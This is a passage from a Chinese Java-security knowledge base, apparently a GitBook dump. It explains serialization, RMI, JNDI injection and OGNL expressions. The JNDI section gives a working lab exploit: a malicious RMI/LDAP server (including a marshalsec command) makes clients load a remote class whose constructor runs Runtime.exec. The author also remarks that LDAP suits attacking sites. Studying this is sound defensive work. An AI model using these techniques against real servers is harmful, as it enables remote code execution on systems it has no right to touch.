by Gitbook该文章修订时间： 2023-08-17 03:49:33 "},"知识库/02.JAVA安全/04.Java序列化与反序列化/":{"url":"知识库/02.JAVA安全/04.Java序列化与反序列化/","title":"04.Java序列化与反序列化","keywords":"","body":"Java 序列化和反序列化 介绍 序列化和反序列化都是在对象的基础上进行的！！！ 必须要 **implements Serializable** 的类才可以序列化和反序列化 什么是序列化和反序列化 java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。 Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。即序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。 序列化要求 一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口，它的定义如下： public interface Serializable { } Serializable接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。 其他 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外： public final void writeObject(Object x) throws IOException 上面的方法序列化一个对象，并将它发送到输出流。相似的 ObjectInputStream 类包含如下反序列化一个对象的方法： public final Object readObject() throws IOException, ClassNotFoundException 该方法从流中取出下一个对象，并将对象反序列化。它的返回值为Object，因此，你需要将它转换成合适的数据类型。 序列化步骤 把对象转换为字节序列 步骤一：创建一个ObjectOutputStream输出流； 步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象。 反序列化步骤 把字节序列转换为对象 步骤一：创建一个ObjectInputStream输入流； 步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。 代码举例 序列化和反序列化 --> 文件 package org.example; import java.io.*; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 // 创建一个FileOutputStream，且将这个FileOutputStream封装到ObjectOutputStream中 ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"123.ser\")); // 调用writeObject方法，序列化对象到文件123.ser中 objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); // 反序列化 // 创建一个FIleInutputStream，并将FileInputStream封装到ObjectInputStream中 try (ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"123.ser\"))) { // 调用readObject从123.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型 SerializeDemo ss = (SerializeDemo) objectInputStream.readObject(); System.out.println(ss.add(1,2)); } } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } 这里要注意以下要点： readObject() 方法中的 try/catch代码块尝试捕获 ClassNotFoundException 异常。对于 JVM 可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个 ClassNotFoundException 异常。 readObject() 方法的返回值被转化成 SerializeDemo引用。 序列化和反序列化 --> bytes数组 package org.example; import java.io.*; import java.util.Arrays; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); // 本体 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); // 只是一个装饰器的作用 Filter模式，懂？ objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); SerializeDemo serializeDemo1 = (SerializeDemo)objectInputStream.readObject(); objectInputStream.close(); serializeDemo1.add(1,2); } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } /* [-84, -19, 0, 5, 115, 114, 0, 25, 111, 114, 103, 46, 101, 120, 97, 109, 112, 108, 101, 46, 83, 101, 114, 105, 97, 108, 105, 122, 101, 68, 101, 109, 111, -89, 103, -99, 60, 6, -29, 97, -91, 2, 0, 1, 73, 0, 1, 120, 120, 112, 0, 0, 2, -102] 669 */ 序列化特征 十六进制查看我们生成的123.ser # hexdump没有xxd直观 xxd 123.ser xxd显示的结果，中间那一栏是文件的十六进制显示，最右边是字符显示。这里需要注意的特征值就是16进制显示时的前32位： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 （这是在黑盒挖掘反序列化漏洞很重要的一个点） 00 05：STREAM_VERSION，序列化协议版本。 安全性 因为Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法，因此，它存在一定的安全隐患。一个精心构造的byte[]数组被反序列化后可以执行特定的Java代码，从而导致严重的安全漏洞。 实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。 反序列化漏洞的攻击流程 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主重写（也可能是也有组件重写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主重写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等； 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(如commons-collections利用链) 重写readObject：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数重写点 漏洞挖掘 java是支持自定义readObject与writeObject方法的，只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它，如果这个自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。 举例如下： 可以看到自定义的readObject的确执行了，不过真实的应用中危险操作比较隐蔽。 需要注意的是，实现 readObject/writeObject 方法一定需要private 私有化，否则会找不到自定义的方法，从而使用ObjectOutputStream中的readObject方法 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-24 14:47:52 "},"知识库/02.JAVA安全/05.RMI基础/":{"url":"知识库/02.JAVA安全/05.RMI基础/","title":"05.RMI基础","keywords":"","body":"RMI概述 RMI: 远程方法调用(Remote Method Invocation)，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。 Java RMI：用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟机中的对象的方法（一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法。），只不过是允许被远程调用的对象要通过一些标志加以标识。 提供服务的一方我们称之为服务器，而实现远程调用的一方我们称之为客户端。 具体实现方法： 远程服务器提供具体的类和方法，本地会通过某种方式获得远程类的一个代理，然后通过这个代理调用远程对象的方法，方法的参数是通过序列化与反序列化的方式传递的，所以： 只要服务端的对象提供了一个方法，这个方法接收的是一个Object类型的参数， 且远程服务器的classpath中存在可利用pop链，那么我们就可以通过在客户端调用这个方法，并传递一个精心构造的对象的方式来攻击rmi服务。 RMI实现机制 要实现RMI，服务器和客户端必须共享同一个接口。Java的RMI规定此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException。 上面说了本地会通过某种方式获得远程对象的代理，那么具体是怎么的实现机制呢？RMI模式中除了有Client与Server，还借助了一个Registry(注册中心)。 因此，RMI由3个部分构成 第一个是rmiregistry（JDK提供的一个可以独立运行的程序，在bin目录下） 第二个是server端的程序，对外提供远程对象 第三个是client端的程序，想要调用远程对象的方法。 | Server | Registry | Client | | :---: | :---: | :---: | | 提供具体的远程对象 | 一个注册表，存放着远程对象的位置（ip、端口、标识符） | 远程对象的使用者 | 其中Server与Registry可以在同一服务器上实现，也可以布置在不同服务器上，现在一个完整的RMI流程可以大概描述为： 启动Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。 Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的 Naming/Context/Registry（下面实例用的Registry）等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称。 Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称）再使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Server那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。 RMI的交互图： PS： 图中的stub就是客户端代理，skeleton就是服务端代理 远程方法调用的通信模式： RMI实现举例 实现过程 大概实现过程 定义远程接口 服务端实现远程接口 服务端注册远程对象 客户端调用接口 实现举例 HelloInterface.java // 定义一个远程接口 package com.company; import java.rmi.Remote; import java.rmi.RemoteException; public interface HelloInterface extends Remote { // 创建接口，必须继承Remote String say (String name) throws RemoteException; // 每个函数必须要抛出 RemoteException 异常 } HelloImpl.java // 实现远程接口 package com.company; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; // 必须要这个，不然会报序列化的错 public class HelloImpl extends UnicastRemoteObject implements HelloInterface { public HelloImpl() throws RemoteException { // 必须要这个 super(); } @Override public String say(String name) throws RemoteException { // 实现刚才定义的接口的方法 return \"test \" + name; } } Server.java // 创建一个注册表，并注册远程对象 package com.company; import java.net.MalformedURLException; import java.rmi.AlreadyBoundException; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; //注册远程对象 public class Server { public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException { HelloInterface helloService = new HelloImpl(); LocateRegistry.createRegistry(1099); // 创建 System.setProperty(\"java.rmi.server.hostname\",\"127.0.0.1\"); // 绑定IP，默认是 127.0.0.1 Registry registry = LocateRegistry.getRegistry(); // 获取实例 registry.bind(\"test\",helloService); // 注册远程对象 //Naming.bind(\"test\",helloService); // 上面2行可以用这个替换 } } Client.java // 查找远程调用方法，并且调用远程方法 package com.company; import java.net.MalformedURLException; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Client { public static void main( String[] args ) throws RemoteException, NotBoundException, MalformedURLException { // HelloInterface hello = (HelloInterface) Naming.lookup(\"rmi://127.0.0.1:1099/test\"); // 写法都可 Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099); HelloInterface hello = (HelloInterface) registry.lookup(\"test\"); System.out.println(hello.says(\"123123\")); } } 注意事项 接口需要继承Remote接口，且方法需要抛出RemoteException错误 接口的实现类需要继承UnicastRemoteObject，同样的方法需要抛出RemoteException错误 如果远程方法需要传参，需要保证参数是可序列化的，我这里传参只是传了字符串，字符串是可序列化的，如果传参是自定义的对象，那么这个对象需要实现Serilizable接口 如果服务端与客户端不在同一主机，需要保证调用的远程对象实现的远程接口在客户端与服务端都存在 参考文章 https://www.jianshu.com/p/5c6f2b6d458a https://blog.csdn.net/qq_28081453/article/details/83279066 https://www.cnblogs.com/fanghao/p/8918953.html https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:30:06 "},"知识库/02.JAVA安全/06.JNDI注入原理及利用/":{"url":"知识库/02.JAVA安全/06.JNDI注入原理及利用/","title":"06.JNDI注入原理及利用","keywords":"","body":"https://xz.aliyun.com/t/6633 介绍 JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中,就像人的名字或DNS中的域名与IP的关系。 结构 JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接口。我们的应用可以通过JNDI的API去访问相关服务提供的接口 JDNI的服务是可以拓展的，可以从JNDI页面下载其他服务提供商，也可以从远程获得其他服务提供商 JDK包括以下命名/目录服务的服务： 轻型目录访问协议（ldap） 通用对象请求代理体系结构（CORBA），通用对象服务（COS）名称服务 Java远程方法调用（RMI）注册表 域名服务（DNS） Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。 其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等 代码格式如下： String jndiName = \"\"; Context context = new InitiaContext(); DataSource ds = (DataSource) context.lookup(jndiName) 这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。 JNDI注入 JNDI 注入其实就是当上下文中jndiName 这个变量可控的情况下，引发的漏洞，可将远程class文件加载，从而导致远程代码执行（RCE） 测试环境：jdk8u181 // client.java package JNDIInject; import javax.naming.Context; import javax.naming.InitialContext; public class Client { public static void main(String[] args) throws Exception { System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); String uri = \"rmi://127.0.0.1:1099/aa\"; Context context = new InitialContext(); context.lookup(uri); } } // server package JNDIInject; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference aa = new Reference(\"ExecTest\", \"ExecTest\", \"http://127.0.0.1:8081/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa); System.out.println(\"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'\"); registry.bind(\"aa\", refObjWrapper); } } 注意，在服务端代码绑定aa的时候，地址后面一定要加上/ 如果不加上/，那么则向web服务请求恶意字节码的时候，则会找不到该字节码 正确请求如下： //Exec.java public class ExecTest { public ExecTest() throws Exception { System.out.println(\"123\"); } } 执行方式 首先使用jdk8u181 编译ExecTest # jdk 8u181 javac ExecTest.java 然后使用python 启动一个web服务，ExecTest.class 要可访问 利用过程 攻击者提供恶意的rmi注册中心 JNDI 去恶意的rmi注册中心查询aa类 恶意服务器再返回ExecTest.class 字节码文件给客户端 client 再执行ExecTest.class 字节码 结果 此处客户端有一句 System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); jdk = 8u181 , 这里是存在trustCodebaseURL的限制，只信任已有的codebase地址，不能从指定codebase下载字节码 攻击链分析 RMI 环境 jdk8u181 分析 在Client.java 的lookup处打上断点,开始分析, 首先进入context.lookup()的lookup处 InitialContext.java // InitialContext.java public Object lookup(String name) throws NamingException { //getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象 //然后在对应协议中去lookup搜索，我们进入lookup函数 return getURLOrDefaultInitCtx(name).lookup(name); } GenericURLContext.java // GenericURLContext.class // var1 = rmi://127.0.0.1:1099/aa public Object lookup(String var1) throws NamingException { //此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址 //不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext //进入不同的协议路线 // 获取rmi注册中心的相关数据 ResolveResult var2 = this.getRootURLContext(var1, this.myEnv); // 获取注册中心对象 Context var3 = (Context)var2.getResolvedObj(); Object var4; try { // 去注册中心lookup，进入此处 lookup var4 = var3.lookup(var2.getRemainingName()); } finally { var3.close(); } return var4; } RegistryContext.java // RegistryContext.class public Object lookup(Name var1) throws NamingException { if (var1.isEmpty()) { return new RegistryContext(this); } else { // var1 = aa，进入else语句 Remote var2; try { var2 = this.registry.lookup(var1.get(0)); // RMI 客户端与注册中心通信，返回RMI服务IP，地址等信息 } catch (NotBoundException var4) { throw new NameNotFoundException(var1.get(0)); } catch (RemoteException var5) { throw (NamingException)wrapRemoteException(var5).fillInStackTrace(); } return this.decodeObject(var2, var1.getPrefix(1)); // 进入此处decodeObject() } } private Object decodeObject(Remote var1, Name var2) throws NamingException { try { // Reference 对象会进行连接，获取远程class文件地址 Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; Reference var8 = null; if (var3 instanceof Reference) { var8 = (Reference)var3; } else if (var3 instanceof Referenceable) { var8 = ((Referenceable)((Referenceable)var3)).getReference(); } if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) { throw new ConfigurationException(\"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.\"); } else { // 获取 Reference 对象，进入此处getObjectInstance return NamingManager.getObjectInstance(var3, var2, this, this.environment); } } catch (NamingException var5) { throw var5; } catch (RemoteException var6) { throw (NamingException)wrapRemoteException(var6).fillInStackTrace(); } catch (Exception var7) { NamingException var4 = new NamingException(); var4.setRootCause(var7); throw var4; } } NamingManager.java 在这里看到了熟悉的newInstance()，实例化，想想写的ExecTest.java 只有一个构造函数，实例化之后，就会执行构造函数中的恶意代码 继续向下看，走到loadClass函数时，就会向工厂请求ExecTest.class 最后在这里实例化ExecTest，执行构造函数的Runtime.getRuntime.exec(),弹出计算器 可以发现命令执行完成了，但是出现了报错，我们可以更换一个命令执行点，在factor.getObjectInstance复写该函数执行命令。 报错原因是因为我们的类在实例化之后不能转换成ObjectFactor (ObjectFactor) clas.newInstance()，只需要我们的类实现该接口即可； // ExecTest.java import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.util.Hashtable; public class ExecTest implements ObjectFactory { public ExecTest() throws Exception { System.out.println(\"123\"); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } LDAP LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。但看了这个解释等于没说，其实也就是一个数据库，可以把它与mysql对比！ 具有以下特点： 基于TCP/IP协议 同样也是分成服务端/客户端；同样也是服务端存储数据，客户端与服务端连接进行操作 相对于mysql的表型存储；不同的是LDAP使用树型存储 因为树型存储，读性能佳，写性能差，没有事务处理、回滚功能 树层次分为以下几层： dn：一条记录的详细位置，由以下几种属性组成 dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库） ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支） cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？） 举个例子一条记录就是 dn=\"uid=aaron.luo,ou=oa,dc=example,dc=com\" 其实利用方法是没差的，我们之前分析的时候也可以看到代码会根据传入协议头的区别去进入对应的处理函数，只需要修改传入参数的解析头,再启动ldap服务，恶意class的web服务即可 环境 jdk8u121(windows) LdapClient.java //ldapClient.java import javax.naming.Context; import javax.naming.InitialContext; public class LdapClient { public static void main(String[] args) throws Exception{ String uri = \"ldap://127.0.0.1:1389/aa\"; Context ctx = new InitialContext(); ctx.lookup(uri); } } Server 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 启动一个ldap服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#ExecTest ExecTest.java import javax.naming.Context; import javax.naming.Name; import javax.naming.directory.Attributes; import javax.naming.spi.DirObjectFactory; import java.util.Hashtable; public class ExecTest implements DirObjectFactory { public ExecTest() throws Exception{ Runtime.getRuntime().exec(\"calc.exe\"); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment, Attributes attrs) throws Exception { return null; } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } 分析 分析同rmi，在客户端处强制进入lookup 在initialContext.java 中，继续进入lookup，其中name 为传入的uri 在ldapURLContext.java 中，uri 就是 var1，继续lookup，进入lookup GenericURLContext.java 中getRootURLContext 在找协议，以及需要寻找的指定类，继续进入lookup partialConpositeContext.java中，this指代上下文中解析ldap的地址，然后再去寻找ldap结构，进入p_lookup() ComponentContext.java, 传入aa类，再进入c_lookup寻找 LdapCtx.java, 在这里才把codebase找到，以及对应的key值foo，恶意factor ExecTest ，继续跟进 到722行，在这里将var3，var1传入，var3对象包含了className，classFactor，classFactorLocation，这里ldap已经将恶意类信息返回给客户端了，客户端此时则需要向恶意web服务请求字节码，并完成实例化，即可执行恶意类中的命令执行函数，此时我们进入getObjectInstance() DirectorManager.java，看到这里，是不是很熟悉，如果忘记了，请看上面rmi的详解，在这里我们继续进入getObjectFactoryFromReference() NamingManger.java，在这里，我们看到已经请求web服务，获取到字节码了，到clas.newInstance() 这里，就能执行恶意字节码中的恶意代码了 总结 通过分析，我们发现在使用ldap，没有codebase的限制，而rmi在我windows jdk8u121处都有codebase的限制，所以我们在日站的时候最好是使用ldap来进行注入 粘贴一些前人总结的限制吧 RMI JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。 所以不受RMI动态加载恶意类的 java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性的限制。具有更多的利用空间 但是我们之前实验还是有版本无法复现，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类 LDAP 在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制， 在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:16:03 "},"知识库/02.JAVA安全/07.OGNL表达式/":{"url":"知识库/02.JAVA安全/07.OGNL表达式/","title":"07.OGNL表达式","keywords":"","body":"介绍 OGNL 是 Object-Graph Navigation Language（对象导航图语言）的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。 Ognl 是一个功能强大的表达式语言，用来获取和设置 java 对象的属性 ，它旨在提供一个更高抽象度语法来对 java 对象图进行导航。 官方文档：https://commons.apache.org/proper/commons-ognl/language-guide.html 对于开发者来说，使用 OGNL，可以用简洁的语法来完成对 java 对象的导航。通常来说：通过一个 “路径” 来完成对象信息的导航，这个 “路径” 可以是到 java bean 的某个属性，或者集合中的某个索引的对象，等等，而不是直接使用 get 或者 set 方法来完成。 三要素 首先来介绍下 OGNL 的三要素： 表达式（Expression）： 表达式是整个 OGNL 的核心内容，所有的 OGNL 操作都是针对表达式解析后进行的。通过表达式来告诉 OGNL 操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。 Root 对象： OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。 上下文环境： 有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。 说白了上下文就是一个 MAP 结构，它实现了 java.utils.Map 的接口。 使用OGNL表达式 pom.xml ognl ognl 3.1.11 基础用法举例 对Root对象的访问 OGNL 使用的是一种链式的风格进行对象的访问，中间使用.进行连接；所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); System.out.println(Ognl.getValue(\"age\", user)); // 16 System.out.println(Ognl.getValue(\"name\", user)); // hello System.out.println(Ognl.getValue(\"name.length\", user)); // 5 System.out.println(Ognl.getValue(\"info\", user)); // Info(a=1, b=2) System.out.println(Ognl.getValue(\"info.a\", user)); // 1 } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对上下文对象的访问 使用 OGNL 的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。 当访问上下文环境当中的参数时候，需要在表达式前面加上 '#' ，表示了与访问 Root 对象的区别。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"#test\", context, user)); // testValue System.out.println(Ognl.getValue(\"#aaa\", context, user)); // User(name=hello, age=16, info=Info(a=1, b=2)) System.out.println(Ognl.getValue(\"#aaa.name\", context, user)); // hello } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对静态变量的访问‼️ 在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式如 @[class]@[field/method()]。 package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static String test = \"66666\"; public static void main(String[] args) throws OgnlException { System.out.println(Ognl.getValue(\"@org.example.OgnlTest@test\", null)); } } 方法的调用‼️ 如果需要调用 Root 对象或者上下文对象当中的方法也可以使用类似的方式来调用。甚至可以传入参数。 赋值的时候可以选择上下文当中的元素进行给 Root 对象的 name 属性赋值。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"getName()\", context, user)); // null Ognl.getValue(\"setName(#test)\", context, user); // 执行setName方法 System.out.println(Ognl.getValue(\"getName()\", context, user)); // testValue } } @Data class User { private String name; private int age; } 对数组和集合的访问 OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。 package org.example; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { List list = new ArrayList<>(); list.add(\"123\"); list.add(\"456\"); Map map = new HashMap(); map.put(\"test1\", \"value1\"); Map context = new HashMap(); context.put(\"list\", list); context.put(\"map\", map); System.out.println(Ognl.getValue(\"#list[0]\", context, list)); // 123 System.out.println(Ognl.getValue(\"#map['test1']\", context, map)); // value1 } } 投影与选择 OGNL 支持类似数据库当中的选择与投影功能。 个人感觉有点类似stream 投影：选出集合当中的相同属性组合成一个新的集合。语法为 collection.{XXX}，XXX 就是集合中每个元素的公共属性。 选择：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 collection.{Y XXX}，其中 Y 是一个选择操作符，XXX 是选择用的逻辑表达式。 选择操作符有 3 种： ? ：选择满足条件的所有元素 ^：选择满足条件的第一个元素 $：选择满足条件的最后一个元素 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User u1 = new User(\"name1\", 11); User u2 = new User(\"name2\", 22); User u3 = new User(\"name3\", 33); User u4 = new User(\"name4\", 44); ArrayList list = new ArrayList(); list.add(u1); list.add(u2); list.add(u3); list.add(u4); Map context = new HashMap(); context.put(\"list\", list); System.out.println(Ognl.getValue(\"#list.{age}\", context, list)); // [11, 22, 33, 44] System.out.println(Ognl.getValue(\"#list.{? #this.age > 22}\", context, list)); // [User(name=name3, age=33), User(name=name4, age=44)] System.out.println(Ognl.getValue(\"#list.{^ #this.age > 22}\", context, list)); // [User(name=name3, age=33)] System.out.println(Ognl.getValue(\"#list.{$ #this.age > 22}\", context, list)); // [User(name=name4, age=44)] } } @Data class User { private String name; private int age; public User(String name, int age) { this.name = name; this.age = age; } } 创建对象‼️ OGNL 支持直接使用表达式来创建对象。主要有三种情况： 构造 List 对象：使用 {}, 中间使用 ',' 进行分割如 {\"aa\", \"bb\", \"cc\"} 构造 Map 对象：使用 #{}，中间使用 ', 进行分割键值对，键值对使用 ':' 区分，如 #{\"key1\" : \"value1\", \"key2\" : \"value2\"} 